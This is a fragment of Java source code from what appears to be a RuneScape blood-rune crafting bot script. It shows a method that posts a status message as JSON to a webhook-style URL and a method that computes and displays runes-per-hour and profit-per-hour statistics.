            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setDoOutput(true);
            connection.setRequestProperty("Content-Type", "application/json");

            // JSON payload
            String payload = String.format("{\"content\": \"%s\"}", message);

            try (OutputStream os = connection.getOutputStream()) {
                os.write(payload.getBytes());
                os.flush();
            }

            // Read the response code
            int responseCode = connection.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK || responseCode == HttpURLConnection.HTTP_NO_CONTENT) {
                // Don't do anything
            } else {
                // Don't do anything
            }
        } catch (Exception e) {
            // Don't do anything
        }
    }

    public static void updateStatLabel() {
        // Calculations for the statistics label
        long currentTime = System.currentTimeMillis();
        double elapsedTimeInHours = (currentTime - startTime) / (1000.0 * 60 * 60);
        double runesPerHour = craftedRunes / elapsedTimeInHours;

        // Calculate the total profit subtracting the cost of the blood essences used
        double totalProfit = (craftedRunes * runePrice) - (bloodEssenceUsed * essencePrice);
        double profitPerHour = totalProfit / elapsedTimeInHours;

        // Format runes per hour with dot as thousand separator and no decimals
        DecimalFormatSymbols symbols = new DecimalFormatSymbols(Locale.getDefault());
        symbols.setGroupingSeparator('.');
        symbols.setDecimalSeparator(','); // Set the decimal separator to comma
        DecimalFormat runesFormat = new DecimalFormat("#,###", symbols);
        String runesPerHourFormatted = runesFormat.format(runesPerHour);

        // Format profit per hour as 'k' with two decimals, dot as thousand separator, and comma as decimal separator
        DecimalFormat profitFormat = new DecimalFormat("#,##0.00k", symbols);
        String profitPerHourFormatted = profitFormat.format(profitPerHour / 1000);

        // Update the statistics label
        String statistics = String.format("Runes/hr: %s | Profit/hr: %s", runesPerHourFormatted, profitPerHourFormatted);
        Paint.setStatistic(statistics);
    }
}